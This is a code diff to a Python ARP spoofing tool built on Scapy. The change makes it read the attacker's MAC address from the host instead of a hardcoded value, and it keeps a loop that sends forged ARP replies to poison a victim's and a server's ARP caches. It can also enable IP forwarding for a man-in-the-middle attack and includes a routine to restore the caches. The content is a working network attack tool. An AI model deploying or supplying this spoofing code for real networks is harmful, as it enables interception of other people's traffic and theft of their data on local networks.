@@ -30,12 +30,6 @@ class ARPSpoof:
 		 self.duckforce = duckforce
 		 
 	def start_attack(self):
-		if self.victim1_ip == '0.0.0.0':
-			print("\n \nSet your Victim's IP Address")
-			self.victim1_ip = input()
-		
-		VICTIM1_MAC = getmacbyip(self.victim1_ip)
-		VICTIM2_MAC = getmacbyip(self.victim2_ip)
 		
 		if self.mitm:
 			print("\n Enabling IP Forwarding (MitM attack)...")
@@ -43,10 +37,13 @@ class ARPSpoof:
 		else:
 			# Disable ip forward
 			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-			print("closed")
 			
-		ATTACKER_MAC = "08:00:27:db:96:6a"
-		#print(ATTACKER_MAC)
+		#get MAC Addresses
+		ATTACKER_MAC = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
+		VICTIM1_MAC = getmacbyip(self.victim1_ip)
+		VICTIM2_MAC = getmacbyip(self.victim2_ip)
+		
+		#Create packets
 		while True:
 			#Poisoning the Victim
 			arp= Ether() / ARP()
@@ -58,7 +55,7 @@ class ARPSpoof:
 
 			sendp(arp, iface='eth0')
 
-			#Poison the Server
+			#Poison the Server/Victim2
 			arp= Ether() / ARP()
 			arp[Ether].src = ATTACKER_MAC
 			arp[ARP].hwsrc = ATTACKER_MAC
@@ -76,12 +73,12 @@ class ARPSpoof:
 		return
 	 	
 	def restore_arp(self):
-		ATTACKER_MAC = "08:00:27:db:96:6a"
+		#get MAC Addresses
+		ATTACKER_MAC = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])
 		VICTIM1_MAC = getmacbyip(self.victim1_ip)
 		VICTIM2_MAC = getmacbyip(self.victim2_ip)
-		print(VICTIM1_MAC)
-		print(VICTIM2_MAC)
-		#print(ATTACKER_MAC)
+		
+		#Create packets to 
 		# Restore the ARP cache of the Victim
 		arp = Ether() / ARP()
 		arp[Ether].src = ATTACKER_MAC
